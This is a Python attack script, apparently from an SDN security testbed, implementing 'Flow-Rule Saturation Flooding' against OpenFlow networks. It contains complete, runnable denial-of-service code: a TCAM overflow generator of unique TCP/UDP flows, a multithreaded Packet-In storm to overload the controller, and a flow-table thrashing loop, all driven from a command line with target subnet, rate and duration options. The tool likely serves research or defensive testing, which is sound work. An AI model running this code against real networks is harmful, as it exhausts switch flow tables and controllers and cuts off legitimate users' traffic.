#!/usr/bin/env python3
"""
=============================================================================
ATTACK E: Flow-Rule Saturation Flooding
=============================================================================
Exploits SDN's fundamental weakness: the TCAM (Ternary Content Addressable
Memory) in physical switches has a limited number of flow entries.

Attack mechanism:
  1. Generate massive numbers of unique flows (random 5-tuples)
  2. Each unique flow causes a Packet-In event to the controller
  3. Controller installs a new flow rule for each → TCAM fills up
  4. When TCAM is full, switch falls back to "fail-open" (flood all)
     OR "fail-secure" (drop all unknown packets)
  5. Either way, legitimate traffic is disrupted

Secondary effect (Packet-In Storm):
  - Each unseen flow → Packet-In to controller
  - Controller CPU saturates processing thousands of Packet-In/sec
  - Controller becomes unresponsive → loss of network control plane

Attack variants:
  A. TCAM Overflow: fill flow table with random rules
  B. Packet-In Storm: overwhelm controller's CPU
  C. Flow Table Thrashing: rapidly install+expire rules to prevent caching

Usage:
    python3 attacks/flow_rule_saturation.py \
        --target 10.0.0.0/24 \
        --duration 60 \
        --rate 10000
=============================================================================
"""

import time
import random
import socket
import struct
import threading
import argparse
import logging
import ipaddress
import subprocess
import sys

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [FLOW-SAT] %(message)s'
)
LOG = logging.getLogger('FlowSaturation')


def random_ip_in_subnet(subnet: str = '10.0.0.0/8') -> str:
    """Generate a random IP address within the given subnet."""
    net  = ipaddress.IPv4Network(subnet, strict=False)
    addr = net.network_address + random.randint(1, net.num_addresses - 2)
    return str(addr)


class TCAMOverflowAttack:
    """
    Generates unique flow 5-tuples to exhaust switch TCAM capacity.

    Each unique (src_ip, dst_ip, src_port, dst_port, proto) combination
    is treated as a new flow by the SDN controller → new TCAM entry installed.

    Standard OVS supports ~1000-10000 flow entries per table.
    Physical switches (OpenFlow-enabled): typically 1000-4000 entries.
    """

    def __init__(self, dst_subnet: str, rate_fps: int, duration: int,
                 src_subnet: str = '172.16.0.0/12'):
        self.dst_subnet = dst_subnet
        self.src_subnet = src_subnet
        self.rate_fps   = rate_fps    # flows per second
        self.duration   = duration
        self.running    = False
        self.flows_sent = 0
        self._seen_tuples = set()    # track generated tuples

    def _gen_unique_5tuple(self) -> tuple:
        """Generate a unique (src_ip, dst_ip, sport, dport, proto) tuple."""
        while True:
            src_ip  = random_ip_in_subnet(self.src_subnet)
            dst_ip  = random_ip_in_subnet(self.dst_subnet)
            sport   = random.randint(1024, 65535)
            dport   = random.randint(1, 1024)   # use well-known ports to trigger rules
            proto   = random.choice(['tcp', 'udp'])
            t5      = (src_ip, dst_ip, sport, dport, proto)
            if t5 not in self._seen_tuples:
                self._seen_tuples.add(t5)
                return t5

    def _send_flow(self, src_ip, dst_ip, sport, dport, proto):
        """Send a single packet to create a new flow at the controller."""
        try:
            if proto == 'tcp':
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.05)
                # Attempt connection (SYN triggers Packet-In)
                sock.connect_ex((dst_ip, dport))
                sock.close()
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(b'\x00' * 32, (dst_ip, dport))
                sock.close()
        except Exception:
            # Connection errors expected — we only care about generating flows
            pass
        self.flows_sent += 1

    def run(self):
        self.running = True
        LOG.info('TCAM Overflow: target=%s rate=%d fps dur=%ds',
                 self.dst_subnet, self.rate_fps, self.duration)
        LOG.info('Each unique flow → Packet-In → new TCAM entry')

        start    = time.time()
        interval = 1.0 / self.rate_fps

        while self.running and (time.time() - start) < self.duration:
            src_ip, dst_ip, sport, dport, proto = self._gen_unique_5tuple()
            self._send_flow(src_ip, dst_ip, sport, dport, proto)
            time.sleep(interval)

        elapsed  = time.time() - start
        LOG.info('TCAM Overflow done: %d unique flows in %.1fs (%.0f fps)',
                 self.flows_sent, elapsed, self.flows_sent / elapsed)

    def stop(self):
        self.running = False


class PacketInStorm:
    """
    Overwhelms the SDN controller's Packet-In processing pipeline
    by sending a stream of packets that never match any installed rule.

    Each unknown packet hits the table-miss rule → Packet-In to controller.
    At 10,000+ Packet-In/sec, the controller's OpenFlow message queue fills.
    """

    def __init__(self, dst_subnet: str, storm_pps: int, duration: int,
                 num_threads: int = 8):
        self.dst_subnet  = dst_subnet
        self.storm_pps   = storm_pps
        self.duration    = duration
        self.num_threads = num_threads
        self.running     = False
        self.total_pkts  = 0
        self._lock       = threading.Lock()

    def _storm_thread(self, thread_id: int):
        """Worker thread that continuously sends unique-source packets."""
        sock     = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        interval = float(self.num_threads) / self.storm_pps
        start    = time.time()
        sent     = 0

        while self.running and (time.time() - start) < self.duration:
            dst_ip = random_ip_in_subnet(self.dst_subnet)
            dport  = random.randint(1, 65535)
            try:
                sock.sendto(b'\x00' * 64, (dst_ip, dport))
                sent += 1
            except socket.error:
                pass
            time.sleep(interval)

        sock.close()
        with self._lock:
            self.total_pkts += sent
        LOG.debug('[Thread-%d] Sent %d packets', thread_id, sent)

    def run(self):
        self.running = True
        LOG.info('Packet-In Storm: %d pps for %ds via %d threads',
                 self.storm_pps, self.duration, self.num_threads)

        threads = [
            threading.Thread(target=self._storm_thread,
                             args=(i,), daemon=True)
            for i in range(self.num_threads)
        ]
        for t in threads:
            t.start()
        for t in threads:
            t.join(timeout=self.duration + 5)

        LOG.info('Packet-In Storm done: %d total packets', self.total_pkts)

    def stop(self):
        self.running = False


class FlowTableThrashing:
    """
    Rapidly installs and expires flow rules to prevent the controller
    from caching routes and to continuously stress TCAM write operations.

    Uses short-lived flows (TTL = 2s) that expire quickly,
    requiring constant reinstallation.
    """

    def __init__(self, target_ip: str, duration: int, install_rate: int = 500):
        self.target_ip    = target_ip
        self.duration     = duration
        self.install_rate = install_rate   # flows/sec to install
        self.running      = False

    def run(self):
        self.running = True
        LOG.info('Flow table thrashing → %s  %d flows/sec for %ds',
                 self.target_ip, self.install_rate, self.duration)

        sock     = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        start    = time.time()
        interval = 1.0 / self.install_rate
        count    = 0

        while self.running and (time.time() - start) < self.duration:
            # Send to incrementing ports → new flow each time
            port = (count % 60000) + 1024
            try:
                sock.sendto(b'\xff' * 48, (self.target_ip, port))
                count += 1
            except socket.error:
                pass
            time.sleep(interval)

        sock.close()
        LOG.info('Flow thrashing done: %d flows', count)

    def stop(self):
        self.running = False


class FlowRuleSaturationLFA:
    """Orchestrates all flow saturation attack components."""

    def __init__(self, target_subnet: str, duration: int, rate: int,
                 num_threads: int = 4):
        self.target_subnet = target_subnet
        self.duration      = duration
        self.rate          = rate
        self.num_threads   = num_threads

    def run(self):
        LOG.info('╔══════════════════════════════════════════════╗')
        LOG.info('║   Flow-Rule Saturation Flooding Attack       ║')
        LOG.info('╚══════════════════════════════════════════════╝')
        LOG.info('  Target subnet : %s', self.target_subnet)
        LOG.info('  Rate          : %d flows/sec', self.rate)
        LOG.info('  Duration      : %ds', self.duration)
        LOG.info('  Components    : TCAM overflow + Packet-In storm + thrashing')

        # Target a specific host in the subnet for thrashing
        target_ip = random_ip_in_subnet(self.target_subnet)

        components = [
            TCAMOverflowAttack(self.target_subnet, self.rate // 3, self.duration),
            PacketInStorm(self.target_subnet, self.rate, self.duration, self.num_threads),
            FlowTableThrashing(target_ip, self.duration, self.rate // 4),
        ]

        threads = [threading.Thread(target=c.run, daemon=True)
                   for c in components]

        for t in threads:
            t.start()

        # Monitor flow count via OVS CLI
        monitor = threading.Thread(
            target=self._monitor_flow_count, daemon=True)
        monitor.start()

        for t in threads:
            t.join(timeout=self.duration + 15)

        LOG.info('Flow-Rule Saturation attack complete.')

    def _monitor_flow_count(self):
        """Query OVS flow count every 5 seconds."""
        start = time.time()
        while time.time() - start < self.duration:
            try:
                result = subprocess.run(
                    ['ovs-ofctl', 'dump-aggregate', 's1'],
                    capture_output=True, text=True, timeout=3
                )
                if result.returncode == 0:
                    LOG.info('[MONITOR] OVS flow table: %s',
                             result.stdout.strip())
            except Exception:
                pass
            time.sleep(5)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Flow-Rule Saturation LFA')
    parser.add_argument('--target',   default='10.0.0.0/24',
                        help='Target subnet (default: 10.0.0.0/24)')
    parser.add_argument('--duration', type=int, default=60,
                        help='Duration in seconds (default: 60)')
    parser.add_argument('--rate',     type=int, default=5000,
                        help='Flows per second (default: 5000)')
    parser.add_argument('--threads',  type=int, default=4,
                        help='Worker threads (default: 4)')
    args = parser.parse_args()

    attack = FlowRuleSaturationLFA(
        target_subnet= args.target,
        duration     = args.duration,
        rate         = args.rate,
        num_threads  = args.threads
    )
    attack.run()
